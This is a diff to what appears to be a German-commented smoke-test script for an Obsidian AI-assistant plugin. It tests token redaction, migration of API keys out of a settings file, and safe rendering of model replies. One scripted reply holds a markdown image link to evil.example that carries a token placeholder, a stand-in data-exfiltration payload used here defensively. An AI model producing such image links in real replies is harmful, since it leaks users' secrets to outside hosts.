@@ -317,7 +317,8 @@ async function startFakeEndpoint(
 interface ScriptedReply { status?: number; content?: string; toolCall?: { name: string; args: string }; errorMessage?: string }
 async function startScriptedEndpoint(
   respond: (body: { messages: { role: string; content: unknown }[]; tools?: { function: { name: string } }[] }, n: number) => ScriptedReply,
-): Promise<{ url: string; bodies: { messages: { role: string; content: unknown }[]; tools?: { function: { name: string } }[] }[]; close: () => Promise<void> }> {
+): Promise<{ url: string; bodies: { messages: { role: string; content: unknown }[]; tools?: { function: { name: string } }[] }[]; authHeaders: string[]; close: () => Promise<void> }> {
+  const authHeaders: string[] = [];
   const bodies: { messages: { role: string; content: unknown }[]; tools?: { function: { name: string } }[] }[] = [];
   const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "POST, GET, OPTIONS", "Access-Control-Allow-Headers": "*" };
   const server: Server = createServer((req, res) => {
@@ -328,6 +329,7 @@ async function startScriptedEndpoint(
       req.on("end", () => {
         const body = JSON.parse(Buffer.concat(chunks).toString("utf8")) as (typeof bodies)[number];
         bodies.push(body);
+        authHeaders.push(String(req.headers.authorization ?? ""));
         const r = respond(body, bodies.length);
         if (r.status !== undefined && r.status >= 400) {
           res.writeHead(r.status, { "Content-Type": "application/json", ...cors });
@@ -350,7 +352,7 @@ async function startScriptedEndpoint(
   });
   await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
   const port = (server.address() as AddressInfo).port;
-  return { url: `http://127.0.0.1:${port}`, bodies, close: () => new Promise<void>((resolve) => { server.close(() => { resolve(); }); }) };
+  return { url: `http://127.0.0.1:${port}`, bodies, authHeaders, close: () => new Promise<void>((resolve) => { server.close(() => { resolve(); }); }) };
 }
 
 /**
@@ -3379,6 +3381,159 @@ async function main(): Promise<void> {
       await removeOcrStub();
       await cdp.evaluate(`
         const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+        p.settings.model = ${JSON.stringify(modellVorher)};
+        await p.saveSettings();
+        return true;
+      `).catch(() => undefined);
+    }
+
+    // --- 59–62. Verbindungs-Bausteine des Kits (Welle 15, obsidian-kit 0.51.2) ----------------
+    // Koda behaelt `createChatClient` und tauscht nur Einzelbausteine: Schwaerzung (Chat-Client),
+    // Schluesselbund (Endpunkt-Liste/-Aufloesung) und Neutralisierung (Antwort-Rendering). Die
+    // Naht zum Host, die kein Unit-Test sieht: was WIRKLICH auf den Draht geht und was im DOM steht.
+    const TOKEN_KERN = "abc123def456ghi789";
+    const TOKEN = `Bearer ${TOKEN_KERN}`;
+    const modusVorher59 = await cdp.evaluate<string>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].contextMode;`);
+    const labDa59 = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["llm-lab"];`);
+    try {
+      // ── 59: Schwaerzung ueber edit_active_note — das Original kommt in die Notiz, der Draht sieht Platzhalter ──
+      let ok59 = false; let detail59 = "nicht gelaufen";
+      let ok62 = false; let detail62 = "nicht gelaufen";
+      const fake59 = await startScriptedEndpoint((b, n) => {
+        if (n !== 1) return { content: "Erledigt." };
+        const ph = /\[redacted-token-\d+\]/.exec(JSON.stringify(b))?.[0] ?? "KEIN-PLATZHALTER";
+        return { toolCall: { name: "edit_active_note", args: JSON.stringify({ path: "Notes/Project plan.md", mode: "replace_selection", text: `Auth: ${ph}` }) } };
+      });
+      try {
+        await setzeModell("smoke-model", fake59.url);
+        if (!labDa59) {
+          await cdp.evaluate(`
+            window.__kodaLab59 = [];
+            app.plugins.plugins["llm-lab"] = { __kodaSmokeStub: true, api: { apiVersion: 4, status: () => ({ apiVersion: 4, recording: true }), log: (input) => { window.__kodaLab59.push(JSON.parse(JSON.stringify(input))); return "smoke59-" + window.__kodaLab59.length; } } };
+            return true;
+          `);
+        }
+        const idx = await cdp.evaluate<number>(`
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          ${SCENE_JS}
+          ed.setLine(idx, ${JSON.stringify(`Authorization: ${TOKEN} gilt`)});
+          await new Promise((r) => setTimeout(r, 200));
+          ed.setSelection({ line: idx, ch: 15 }, { line: idx, ch: ${15 + TOKEN.length} });
+          p.setContextMode("workspace");
+          void p.ask("Ersetze die Markierung durch eine Zeile.");
+          return idx;
+        `);
+        if (idx < 0) throw new Error("Kulisse nicht hergestellt");
+        const modal = await pollUntil<boolean>(cdp, `return !!document.querySelector(".modal-container .koda-preview");`, 15_000);
+        if (!modal) throw new Error("Bestaetigungs-Modal erschien nicht");
+        await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:last-child") ?? null`);
+        await pollUntil<boolean>(cdp, `return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].busy ? null : true;`, 20_000);
+        for (let i = 0; i < 40 && fake59.bodies.length < 2; i++) await new Promise((r) => setTimeout(r, 250));
+        const inhalt = await cdp.evaluate<string>(`return app.workspace.getMostRecentLeaf(app.workspace.rootSplit).view.editor.getValue();`);
+        const [b1, b2] = [JSON.stringify(fake59.bodies[0] ?? {}), JSON.stringify(fake59.bodies[1] ?? {})];
+        const ph = /\[redacted-token-\d+\]/.exec(b1)?.[0] ?? "";
+        const toolArgs = (fake59.bodies[1]?.messages as { role: string; tool_calls?: { function: { arguments: string } }[] }[] | undefined)
+          ?.find((m) => m.role === "assistant" && m.tool_calls !== undefined)?.tool_calls?.[0]?.function.arguments ?? "";
+        ok59 = ph !== "" && !b1.includes(TOKEN_KERN) && inhalt.includes(`Auth: ${TOKEN}`)
+          && fake59.bodies.length >= 2 && !b2.includes(TOKEN_KERN) && toolArgs.includes(ph);
+        detail59 = `Platzhalter im 1. Body: ${ph !== "" ? ph : "FEHLT"} · Original im 1. Body: ${b1.includes(TOKEN_KERN)} · Notiz traegt „Auth: ${TOKEN}“: ${inhalt.includes(`Auth: ${TOKEN}`)} · `
+          + `Anfragen ${fake59.bodies.length} · Original im 2. Body (auch tool_calls): ${b2.includes(TOKEN_KERN)} · Tool-Argumente der 2. Runde „${toolArgs.slice(0, 70)}“`;
+        // ── 62: Lab-Payload entspricht dem Draht (Platzhalter, kein Original) ──
+        if (labDa59) {
+          ok62 = true; detail62 = "uebersprungen — ein llm-lab-Eintrag existiert bereits (echtes Plugin oder Rest eines abgebrochenen Laufs)";
+        } else {
+          const gesehen = await cdp.evaluate<unknown[]>(`return window.__kodaLab59 ?? [];`);
+          const lab = JSON.stringify(gesehen);
+          ok62 = gesehen.length >= 1 && !lab.includes(TOKEN_KERN) && lab.includes(ph) && ph !== "";
+          detail62 = `Lab-Aufrufe ${gesehen.length} · Original im Lab-Payload: ${lab.includes(TOKEN_KERN)} · Platzhalter im Lab-Payload: ${ph !== "" && lab.includes(ph)}`;
+        }
+      } catch (error) {
+        detail59 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
+      } finally {
+        await fake59.close();
+        await cdp.evaluate(`
+          const path = "Notes/Project plan.md";
+          const leaf = app.workspace.getMostRecentLeaf(app.workspace.rootSplit);
+          if (leaf && leaf.view?.file?.path === path) leaf.view.editor.setValue(${JSON.stringify(FIXTURE_NOTE)});
+          if (app.plugins.plugins["llm-lab"]?.__kodaSmokeStub) delete app.plugins.plugins["llm-lab"];
+          delete window.__kodaLab59;
+          document.querySelector(".modal-container .modal-close-button")?.click();
+          return true;
+        `).catch(() => undefined);
+      }
+      record("59. Schwaerzung: edit_active_note mit Bearer-Token — der Draht sieht nur den Platzhalter (auch in den Tool-Argumenten der 2. Runde), die Notiz bekommt das Original", ok59, detail59);
+      record("62. Lab-Telemetrie traegt den gesendeten Text (Platzhalter), nicht das Original", ok62, detail62);
+
+      // ── 60: Schluesselbund — Klartext-Schluessel wandert beim Aufloesen, der Header traegt ihn trotzdem ──
+      let ok60 = false; let detail60 = "nicht gelaufen";
+      const KEY60 = "smoke-key-0123456789abcdef";
+      const fake60 = await startScriptedEndpoint(() => ({ content: "Ok." }));
+      try {
+        const lese = (): Promise<string> => cdp.evaluate<string>(`
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          return await app.vault.adapter.read(p.manifest.dir + "/data.json");
+        `);
+        // Alter Bestand: Klartext in data.json (so lag es bis 0.21.x).
+        await cdp.evaluate(`
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          p.settings.endpoints = [{ url: ${JSON.stringify(fake60.url)}, apiKey: ${JSON.stringify(KEY60)} }];
+          p.settings.model = "smoke-model";
+          await p.saveData(p.settings);
+          p.resolver.invalidate();
+          await p.newChat();
+          return true;
+        `);
+        const vorher = (await lese()).includes(KEY60);
+        const aufgeloest = await cdp.evaluate<string>(`return (await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].resolver.resolve())?.config?.apiKey ?? "";`);
+        const weg = await pollUntil<boolean>(cdp, `
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          const text = await app.vault.adapter.read(p.manifest.dir + "/data.json");
+          return text.includes(${JSON.stringify(KEY60)}) ? null : true;
+        `, 8000);
+        const nachher = await lese();
+        await frageUndWarte("Smoke: bitte antworten.", fake60, 1);
+        ok60 = vorher && aufgeloest === KEY60 && weg === true && !nachher.includes(KEY60) && nachher.includes("secretId")
+          && fake60.authHeaders[0] === `Bearer ${KEY60}`;
+        detail60 = `Klartext vorher in data.json: ${vorher} · aufgeloeste Config traegt den Schluessel: ${aufgeloest === KEY60} · nach dem Aufloesen in data.json: ${nachher.includes(KEY60)} (secretId da: ${nachher.includes("secretId")}) · `
+          + `Authorization-Header am Endpunkt: ${fake60.authHeaders[0] === `Bearer ${KEY60}` ? "traegt den Schluessel" : `ABWEICHEND (${fake60.authHeaders[0] ?? "kein Aufruf"})`}`;
+      } catch (error) {
+        detail60 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
+      } finally {
+        await fake60.close();
+      }
+      record("60. Schluesselbund: Klartext-Schluessel verlaesst data.json beim Aufloesen, der Authorization-Header traegt ihn weiter", ok60, detail60);
+
+      // ── 61: Neutralisierung — Bild-URL mit Platzhalter und dataviewjs-Block werden Text ──
+      let ok61 = false; let detail61 = "nicht gelaufen";
+      const fake61 = await startScriptedEndpoint(() => ({
+        content: "Bild: ![x](https://evil.example/?d=[redacted-token-1])\n\n```dataviewjs\ndv.paragraph('X')\n```\n\nEnde.",
+      }));
+      try {
+        await setzeModell("smoke-model", fake61.url);
+        const misst = `
+          const el = [...document.querySelectorAll(".koda-assistant")].pop();
+          if (!el) return null;
+          return { img: el.querySelectorAll("img").length, pre: el.querySelectorAll("pre").length, text: el.textContent.includes("dataviewjs") };
+        `;
+        await frageUndWarte("Smoke: Antwort mit Bild und Codeblock.", fake61, 1);
+        await new Promise((r) => setTimeout(r, 800));
+        const live = await cdp.evaluate<{ img: number; pre: number; text: boolean } | null>(misst);
+        await cdp.evaluate(`for (const v of app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].views()) v.renderLog(); return true;`);
+        await new Promise((r) => setTimeout(r, 800));
+        const neu = await cdp.evaluate<{ img: number; pre: number; text: boolean } | null>(misst);
+        const sauber = (m: { img: number; pre: number; text: boolean } | null): boolean => m !== null && m.img === 0 && m.pre === 0 && m.text;
+        ok61 = sauber(live) && sauber(neu);
+        detail61 = `waehrend/nach dem Lauf: ${JSON.stringify(live)} · nach Neuzeichnen des Verlaufs: ${JSON.stringify(neu)} (img 0, pre 0, „dataviewjs“ als Text)`;
+      } catch (error) {
+        detail61 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
+      } finally {
+        await fake61.close();
+      }
+      record("61. Neutralisierung: eine Antwort mit Bild-URL und dataviewjs-Block rendert als Text, auch im neu gezeichneten Verlauf", ok61, detail61);
+    } finally {
+      await cdp.evaluate(`
+        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+        p.setContextMode(${JSON.stringify(modusVorher59)});
         p.settings.model = ${JSON.stringify(modellVorher)};
         await p.saveSettings();
         return true;
